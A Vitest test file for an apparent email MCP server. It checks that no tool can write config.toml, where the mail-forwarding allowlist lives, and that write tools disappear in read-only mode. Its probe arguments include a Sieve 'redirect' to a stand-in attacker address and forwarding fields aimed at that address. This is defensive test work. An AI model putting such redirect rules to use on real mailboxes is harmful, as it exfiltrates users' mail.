/**
 * Owner decision (docs/dev/sieve-plan.md): forwarding is allowed only to the
 * allowlist a person keeps in config.toml, and no MCP tool may write that file.
 *
 * This calls every registered tool, with empty and with "kitchen sink" arguments,
 * while recording every file write the process makes, and asserts that none
 * touched config.toml and that saveConfig was never called. A static check
 * backs it up: no tool or service module reaches the config writer at all.
 */

import { readdirSync, readFileSync, rmSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/server';

const sandbox = await vi.hoisted(async () => {
  const nodeFs = await import('node:fs');
  const nodeOs = await import('node:os');
  const nodePath = await import('node:path');
  const root = nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'no-config-write-'));
  for (const kind of ['CONFIG', 'DATA', 'STATE', 'CACHE']) {
    process.env[`XDG_${kind}_HOME`] = nodePath.join(root, kind.toLowerCase());
  }
  const configDir = nodePath.join(root, 'config', 'email-mcp');
  nodeFs.mkdirSync(configDir, { recursive: true });
  const configFile = nodePath.join(configDir, 'config.toml');
  nodeFs.writeFileSync(
    configFile,
    '[sieve]\nallowed_redirects = ["me@example.org"]\n\n[[accounts]]\nname = "a"\n',
  );
  const writes: string[] = [];
  function recordingFs<T extends Record<string, unknown>>(actual: T, names: string[]): T {
    const wrapped: Record<string, unknown> = { ...actual };
    names.forEach((name) => {
      const original = actual[name];
      if (typeof original !== 'function') return;
      wrapped[name] = (...args: unknown[]) => {
        args.slice(0, 2).forEach((arg) => {
          if (typeof arg === 'string' || arg instanceof URL) writes.push(String(arg));
        });
        return (original as (...a: unknown[]) => unknown)(...args);
      };
    });
    return wrapped as T;
  }

  const ASYNC_WRITERS = [
    'writeFile',
    'appendFile',
    'rename',
    'copyFile',
    'rm',
    'unlink',
    'open',
    'truncate',
    'cp',
  ];
  const SYNC_WRITERS = [
    'writeFileSync',
    'appendFileSync',
    'renameSync',
    'copyFileSync',
    'rmSync',
    'unlinkSync',
    'openSync',
    'truncateSync',
    'cpSync',
    'createWriteStream',
  ];
  return { root, configFile, writes, recordingFs, ASYNC_WRITERS, SYNC_WRITERS };
});

vi.mock('node:fs/promises', async (importOriginal) => {
  const actual = await importOriginal<Record<string, unknown>>();
  const wrapped = sandbox.recordingFs(actual, sandbox.ASYNC_WRITERS);
  return { ...wrapped, default: wrapped };
});
vi.mock('node:fs', async (importOriginal) => {
  const actual = await importOriginal<Record<string, unknown>>();
  const promises = sandbox.recordingFs(
    actual.promises as Record<string, unknown>,
    sandbox.ASYNC_WRITERS,
  );
  const wrapped = { ...sandbox.recordingFs(actual, sandbox.SYNC_WRITERS), promises };
  return { ...wrapped, default: wrapped };
});

const saveConfig = vi.hoisted(() => vi.fn());
vi.mock('../config/loader.js', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  saveConfig,
}));

const { default: createServer } = await import('../server.js');
const { default: registerAllTools } = await import('./register.js');
const { CONFIG_FILE } = await import('../config/xdg.js');

type Toolset = 'full' | 'core' | 'minimal';

function config(readOnly: boolean, toolset: Toolset) {
  return {
    settings: {
      readOnly,
      toolset,
      rateLimit: 10,
      send: { maxAttachmentMb: 25 },
      verification: { enabled: true, includeMagicLinks: false },
      watcher: { enabled: true, folders: ['INBOX'], idleTimeout: 1740 },
      hooks: { rules: [] },
    },
    sieve: { allowedRedirects: ['me@example.org'] },
    accounts: [],
  } as never;
}

const account = {
  name: 'a',
  email: 'a@example.com',
  username: 'a@example.com',
  password: 'pw',
  imap: { host: '127.0.0.1', port: 993, tls: true, starttls: false, verifySsl: true },
  smtp: { host: '127.0.0.1', port: 465, tls: true, starttls: false, verifySsl: true },
  // Disabled, so the Sieve tools answer at once instead of dialing out.
  sieve: { enabled: false, tls: false, starttls: true },
};

async function connect(readOnly: boolean, toolset: Toolset) {
  const server = createServer();
  const stub = new Proxy({}, { get: () => () => [] }) as never;
  const connections = { getAccountNames: () => ['a'], getAccount: () => account } as never;
  registerAllTools(
    server,
    connections,
    stub,
    stub,
    config(readOnly, toolset),
    stub,
    stub,
    stub,
    stub,
    stub,
    stub,
    stub,
  );
  const client = new Client({ name: 'rules-safety-test', version: '0.0.0' });
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await Promise.all([
    client.connect(clientTransport as never),
    server.connect(serverTransport as never),
  ]);
  return {
    client,
    close: async () => {
      await Promise.allSettled([client.close(), server.close()]);
    },
  };
}

async function toolNames(readOnly: boolean, toolset: Toolset): Promise<Set<string>> {
  const { client, close } = await connect(readOnly, toolset);
  try {
    return new Set((await client.listTools()).tools.map((t) => t.name));
  } finally {
    await close();
  }
}

const SIEVE_READ = ['sieve_status', 'sieve_list_scripts', 'sieve_get_script', 'sieve_check_script'];
const SIEVE_WRITE = ['sieve_put_script', 'sieve_activate_script', 'sieve_delete_script'];
const RULES_READ = ['list_local_rules'];
const RULES_WRITE = ['add_local_rule', 'remove_local_rule'];

describe('rule tools: toolset and read-only placement', () => {
  it('full registers all of them', async () => {
    const names = await toolNames(false, 'full');
    [...SIEVE_READ, ...SIEVE_WRITE, ...RULES_READ, ...RULES_WRITE].forEach((n) => {
      expect(names.has(n), n).toBe(true);
    });
  });

  it('read_only keeps the read tools and drops every write tool', async () => {
    const names = await toolNames(true, 'full');
    [...SIEVE_READ, ...RULES_READ].forEach((n) => {
      expect(names.has(n), n).toBe(true);
    });
    [...SIEVE_WRITE, ...RULES_WRITE].forEach((n) => {
      expect(names.has(n), n).toBe(false);
    });
  });

  it.each(['core', 'minimal'] as const)('%s registers none of them', async (toolset) => {
    const names = await toolNames(false, toolset);
    [...SIEVE_READ, ...SIEVE_WRITE, ...RULES_READ, ...RULES_WRITE].forEach((n) => {
      expect(names.has(n), n).toBe(false);
    });
  });
});

describe('no registered tool writes config.toml', () => {
  afterAll(() => {
    rmSync(sandbox.root, { recursive: true, force: true });
  });

  it('holds for every tool, called with empty and with kitchen-sink arguments', async () => {
    expect(CONFIG_FILE).toBe(sandbox.configFile);
    const before = readFileSync(sandbox.configFile, 'utf8');
    const target = path.join(sandbox.root, 'out');
    const kitchenSink = {
      account: 'a',
      name: 'rule',
      rule: 'rule',
      content: 'redirect "thief@evil.com";',
      apply: true,
      disableAll: true,
      dryRun: false,
      confirm: true,
      force: true,
      allowedRedirects: ['thief@evil.com'],
      allowed_redirects: ['thief@evil.com'],
      match: { from: '*' },
      actions: { forwardTo: 'thief@evil.com', flag: true },
      path: sandbox.configFile,
      savePath: sandbox.configFile,
      outputPath: sandbox.configFile,
      filename: 'config.toml',
      directory: path.dirname(sandbox.configFile),
      mailbox: 'INBOX',
      folder: 'INBOX',
      emailId: '1',
      id: '1',
      ids: ['1'],
      to: ['thief@evil.com'],
      subject: 's',
      body: 'b',
      text: 't',
      query: 'q',
      template: 'config',
      sendAt: '2099-01-01T00:00:00Z',
      target,
    };

    const { client, close } = await connect(false, 'full');
    try {
      const { tools } = await client.listTools();
      expect(tools.length).toBeGreaterThan(50);
      for (const tool of tools) {
        for (const args of [{}, kitchenSink]) {
          // eslint-disable-next-line no-await-in-loop -- one call at a time keeps the write log attributable
          await Promise.race([
            client.callTool({ name: tool.name, arguments: args }).catch(() => undefined),
            new Promise((resolve) => {
              setTimeout(resolve, 2_000);
            }),
          ]);
        }
      }
    } finally {
      await close();
    }

    // The recorder works: tools that may write (audit log, local rules) did write.
    expect(sandbox.writes.some((p) => p.includes(sandbox.root))).toBe(true);
    expect(saveConfig).not.toHaveBeenCalled();
    const touched = sandbox.writes.map((p) => path.resolve(p));
    expect(touched).not.toContain(path.resolve(sandbox.configFile));
    expect(touched.filter((p) => path.basename(p).toLowerCase() === 'config.toml')).toEqual([]);
    expect(readFileSync(sandbox.configFile, 'utf8')).toBe(before);
  }, 120_000);

  it('no tool or service module imports the config writer', () => {
    const src = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
    const offenders = ['tools', 'services', 'safety']
      .flatMap((dir) =>
        readdirSync(path.join(src, dir))
          .filter((f) => f.endsWith('.ts') && !f.includes('.test'))
          .map((f) => path.join(dir, f)),
      )
      .filter((file) =>
        /\b(saveConfig|loadRawConfig|CONFIG_FILE)\b/.test(
          readFileSync(path.join(src, file), 'utf8'),
        ),
      );
    expect(offenders).toEqual([]);
  });
});
